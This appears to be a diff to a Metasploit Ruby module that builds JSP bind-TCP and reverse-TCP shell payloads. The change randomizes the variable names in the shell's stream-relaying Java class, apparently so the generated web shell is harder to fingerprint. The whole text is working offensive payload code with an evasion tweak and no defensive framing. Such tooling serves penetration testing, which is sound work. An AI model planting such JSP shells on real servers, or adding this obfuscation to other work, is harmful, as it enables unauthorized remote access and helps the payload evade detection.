@@ -22,6 +22,12 @@ module Msf::Payload::JSP
   # @return [String] jsp code that executes bind TCP payload
   def jsp_bind_tcp
     # Modified from: http://www.security.org.sg/code/jspreverse.html
+
+    var_is = Rex::Text.rand_text_alpha_lower(2)
+    var_os = Rex::Text.rand_text_alpha_lower(2)
+    var_in = Rex::Text.rand_text_alpha_lower(2)
+    var_out = Rex::Text.rand_text_alpha_lower(3)
+
     jsp = <<-EOS
 <%@page import="java.lang.*"%>
 <%@page import="java.util.*"%>
@@ -31,37 +37,37 @@ module Msf::Payload::JSP
 <%
   class StreamConnector extends Thread
   {
-    InputStream is;
-    OutputStream os;
+    InputStream #{var_is};
+    OutputStream #{var_os};
 
-    StreamConnector( InputStream is, OutputStream os )
+    StreamConnector( InputStream #{var_is}, OutputStream #{var_os} )
     {
-      this.is = is;
-      this.os = os;
+      this.#{var_is} = #{var_is};
+      this.#{var_os} = #{var_os};
     }
 
     public void run()
     {
-      BufferedReader in  = null;
-      BufferedWriter out = null;
+      BufferedReader #{var_in}  = null;
+      BufferedWriter #{var_out} = null;
       try
       {
-        in  = new BufferedReader( new InputStreamReader( this.is ) );
-        out = new BufferedWriter( new OutputStreamWriter( this.os ) );
+        #{var_in}  = new BufferedReader( new InputStreamReader( this.#{var_is} ) );
+        #{var_out} = new BufferedWriter( new OutputStreamWriter( this.#{var_os} ) );
         char buffer[] = new char[8192];
         int length;
-        while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
+        while( ( length = #{var_in}.read( buffer, 0, buffer.length ) ) > 0 )
         {
-          out.write( buffer, 0, length );
-          out.flush();
+          #{var_out}.write( buffer, 0, length );
+          #{var_out}.flush();
         }
       } catch( Exception e ){}
       try
       {
-        if( in != null )
-          in.close();
-        if( out != null )
-          out.close();
+        if( #{var_in} != null )
+          #{var_in}.close();
+        if( #{var_out} != null )
+          #{var_out}.close();
       } catch( Exception e ){}
     }
   }
@@ -87,6 +93,12 @@ module Msf::Payload::JSP
   # @return [String] jsp code that executes reverse TCP payload
   def jsp_reverse_tcp
     # JSP Reverse Shell modified from: http://www.security.org.sg/code/jspreverse.html
+
+    var_is = Rex::Text.rand_text_alpha_lower(2)
+    var_os = Rex::Text.rand_text_alpha_lower(2)
+    var_in = Rex::Text.rand_text_alpha_lower(2)
+    var_out = Rex::Text.rand_text_alpha_lower(3)
+
     jsp = <<-EOS
 <%@page import="java.lang.*"%>
 <%@page import="java.util.*"%>
@@ -96,37 +108,37 @@ module Msf::Payload::JSP
 <%
   class StreamConnector extends Thread
   {
-    InputStream is;
-    OutputStream os;
+    InputStream #{var_is};
+    OutputStream #{var_os};
 
-    StreamConnector( InputStream is, OutputStream os )
+    StreamConnector( InputStream #{var_is}, OutputStream #{var_os} )
     {
-      this.is = is;
-      this.os = os;
+      this.#{var_is} = #{var_is};
+      this.#{var_os} = #{var_os};
     }
 
     public void run()
     {
-      BufferedReader in  = null;
-      BufferedWriter out = null;
+      BufferedReader #{var_in}  = null;
+      BufferedWriter #{var_out} = null;
       try
       {
-        in  = new BufferedReader( new InputStreamReader( this.is ) );
-        out = new BufferedWriter( new OutputStreamWriter( this.os ) );
+        #{var_in}  = new BufferedReader( new InputStreamReader( this.#{var_is} ) );
+        #{var_out} = new BufferedWriter( new OutputStreamWriter( this.#{var_os} ) );
         char buffer[] = new char[8192];
         int length;
-        while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
+        while( ( length = #{var_in}.read( buffer, 0, buffer.length ) ) > 0 )
         {
-          out.write( buffer, 0, length );
-          out.flush();
+          #{var_out}.write( buffer, 0, length );
+          #{var_out}.flush();
         }
       } catch( Exception e ){}
       try
       {
-        if( in != null )
-          in.close();
-        if( out != null )
-          out.close();
+        if( #{var_in} != null )
+          #{var_in}.close();
+        if( #{var_out} != null )
+          #{var_out}.close();
       } catch( Exception e ){}
     }
   }
